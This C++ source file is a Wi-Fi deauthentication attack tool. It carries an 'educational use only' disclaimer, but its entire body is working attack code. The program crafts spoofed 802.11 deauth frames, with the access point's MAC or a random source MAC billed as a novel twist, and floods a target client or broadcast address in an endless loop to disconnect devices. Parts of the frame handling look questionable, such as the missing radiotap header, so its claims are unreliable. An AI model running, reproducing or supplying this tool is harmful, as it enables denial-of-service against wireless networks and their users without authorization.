/*
 * Wifi Deauther Tool
 * 
 * DISCLAIMER:
 * This tool is intended solely for educational purposes and authorized security testing.
 * Do not use it on networks for which you do not have explicit permission.
 * The author is not responsible for any misuse or damage.
 *
 * Requirements:
 *  - Linux OS with raw socket support.
 *  - A wireless interface in monitor mode (e.g., wlan0mon).
 *  - Root privileges.
 */

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <chrono>
#include <thread>
#include <sstream>
#include <iomanip>
#include <random>

using namespace std;

// Function to parse MAC address string (format: xx:xx:xx:xx:xx:xx) to 6-byte array.
bool parse_mac(const string &mac_str, uint8_t mac[6]) {
    int values[6];
    if (sscanf(mac_str.c_str(), "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) != 6) {
        return false;
    }
    for (int i = 0; i < 6; i++) {
        mac[i] = static_cast<uint8_t>(values[i]);
    }
    return true;
}

// Generate a random MAC address.
void randomize_mac(uint8_t mac[6]) {
    random_device rd;
    mt19937 gen(rd());
    uniform_int_distribution<> dis(0, 255);
    for (int i = 0; i < 6; i++) {
        mac[i] = dis(gen);
    }
    // Ensure the MAC is locally administered and unicast.
    mac[0] &= 0xFE; // clear multicast bit
    mac[0] |= 0x02; // set local admin bit
}

// Convert a MAC address to a human-readable string.
string mac_to_string(uint8_t mac[6]){
    stringstream ss;
    ss << hex << setfill('0');
    for(int i = 0; i < 6; i++){
        ss << setw(2) << static_cast<int>(mac[i]);
        if(i != 5)
            ss << ":";
    }
    return ss.str();
}

// Frame layout (26 bytes):
// [ Frame Control (2) | Duration (2) | Destination (6) | Source (6) | BSSID (6) | Sequence Control (2) | Reason Code (2) ]
void construct_deauth_frame(uint8_t *frame, const uint8_t dest[6], const uint8_t src[6], const uint8_t bssid[6], uint16_t reason) {
    // Frame Control: version=0, type=Management (0), subtype=Deauthentication (0x0C).
    frame[0] = 0xC0; // 1100 0000
    frame[1] = 0x00; // Flags (set to 0)
    // Duration (2 bytes)
    frame[2] = 0x00;
    frame[3] = 0x00;
    // Destination Address (client or broadcast)
    memcpy(frame + 4, dest, 6);
    // Source Address (AP or randomized, per our novel twist)
    memcpy(frame + 10, src, 6);
    // BSSID (AP address)
    memcpy(frame + 16, bssid, 6);
    // Sequence Control (2 bytes)
    frame[22] = 0x00;
    frame[23] = 0x00;
    // Reason Code (2 bytes, little endian). Common code: 0x0007 ("Class 3 frame received from nonassociated station").
    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;
}

int main(int argc, char *argv[]){
    if(argc < 7){
        cerr << "Usage: " << argv[0] << " -i <interface> -a <AP MAC> -t <Target MAC> [-r]" << endl;
        cerr << "Example: sudo " << argv[0] << " -i wlan0mon -a 00:11:22:33:44:55 -t ff:ff:ff:ff:ff:ff" << endl;
        cerr << "Use -r flag to randomize source MAC on each packet (novel twist)" << endl;
        return 1;
    }
    
    string interface;
    string ap_mac_str;
    string target_mac_str;
    bool randomize = false;
    
    // Simple argument parsing
    for(int i = 1; i < argc; i++){
        string arg = argv[i];
        if(arg == "-i" && i+1 < argc){
            interface = argv[++i];
        } else if(arg == "-a" && i+1 < argc){
            ap_mac_str = argv[++i];
        } else if(arg == "-t" && i+1 < argc){
            target_mac_str = argv[++i];
        } else if(arg == "-r"){
            randomize = true;
        }
    }
    
    if(interface.empty() || ap_mac_str.empty() || target_mac_str.empty()){
        cerr << "Invalid arguments." << endl;
        return 1;
    }
    
    uint8_t ap_mac[6];
    uint8_t target_mac[6];
    uint8_t source_mac[6];
    
    if(!parse_mac(ap_mac_str, ap_mac)){
        cerr << "Invalid AP MAC address format." << endl;
        return 1;
    }
    
    if(!parse_mac(target_mac_str, target_mac)){
        cerr << "Invalid Target MAC address format." << endl;
        return 1;
    }
    
    // Initially, set source MAC to the AP MAC.
    memcpy(source_mac, ap_mac, 6);
    
    // Create a raw socket for sending 802.11 frames.
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if(sockfd < 0){
        perror("Socket creation failed");
        return 1;
    }
    
    // Get the interface index.
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ-1);
    if(ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0){
        perror("ioctl SIOCGIFINDEX");
        close(sockfd);
        return 1;
    }
    int ifindex = ifr.ifr_ifindex;
    
    // Bind the socket to the specified interface.
    struct sockaddr_ll socket_address;
    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, source_mac, 6);
    
    if(bind(sockfd, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0){
        perror("Bind failed");
        close(sockfd);
        return 1;
    }
    
    cout << "Starting deauthentication attack on interface " << interface << endl;
    cout << "AP MAC: " << ap_mac_str << ", Target MAC: " << target_mac_str << endl;
    if(randomize) {
        cout << "Randomizing source MAC address on each packet." << endl;
    }
    
    // Prepare the deauth frame (26 bytes in total).
    uint8_t frame[26];
    uint16_t reason_code = 0x0007; // Reason code for deauthentication
    
    // Continuously send deauth frames.
    while(true){
        if(randomize){
            // Generate a new random source MAC address.
            randomize_mac(source_mac);
            memcpy(socket_address.sll_addr, source_mac, 6);
        } else {
            // Keep using the AP MAC as the source.
            memcpy(source_mac, ap_mac, 6);
        }
        
        construct_deauth_frame(frame, target_mac, source_mac, ap_mac, reason_code);
        
        // Transmit the frame via the raw socket.
        ssize_t sent = sendto(sockfd, frame, sizeof(frame), 0,
                              (struct sockaddr*)&socket_address, sizeof(socket_address));
        if(sent < 0){
            perror("Failed to send frame");
            break;
        }
        
        cout << "Sent deauth packet: Src: " << mac_to_string(source_mac)
             << " -> Dest: " << mac_to_string(target_mac) << endl;
        
        // Throttle the packet transmission (adjustable delay).
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    
    close(sockfd);
    return 0;
}
